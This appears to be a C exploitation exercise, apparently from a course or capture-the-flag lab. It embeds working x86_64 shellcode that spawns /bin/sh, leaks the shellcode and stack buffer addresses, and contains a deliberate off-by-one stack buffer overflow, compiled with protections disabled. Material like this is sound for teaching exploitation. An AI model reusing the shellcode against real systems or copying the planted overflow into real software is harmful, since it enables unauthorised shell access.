/** x86_64 execveat("/bin//sh") 29 bytes shellcode
gcc -O0 -no-pie -fno-stack-protector -fno-omit-frame-pointer -o Q1v2 Q1v2.c 
**/

#include <stdio.h>
//#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>

const uint8_t  __attribute__((section(".text#"))) sc[29] = {
    0x6a, 0x42, 0x58, 0xfe, 0xc4, 0x48, 0x99, 0x52, 0x48, 0xbf,
    0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x54,
    0x5e, 0x49, 0x89, 0xd0, 0x49, 0x89, 0xd2, 0x0f, 0x05
};


/** str
\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf
\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54
\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05
**/

int i;
char c;
char input[32];

void copyInput(bool copy){
   char store[16];
   printf("Debug output:\n");
   printf("%p\n",sc);
   printf("%p\n\n",store);

   printf("Please provide the input string to be stored.\n");
   fgets(input,32,stdin); // no overflow is possible here

   if (copy==true){
      printf("copying inputs:\n");
      i=0;
      while (i<=16) { //of by one
         store[i]=input[i];
         i++;
      }
   }
}

int main (void)
{  bool copyOrNot = true;
   copyInput(copyOrNot);
}
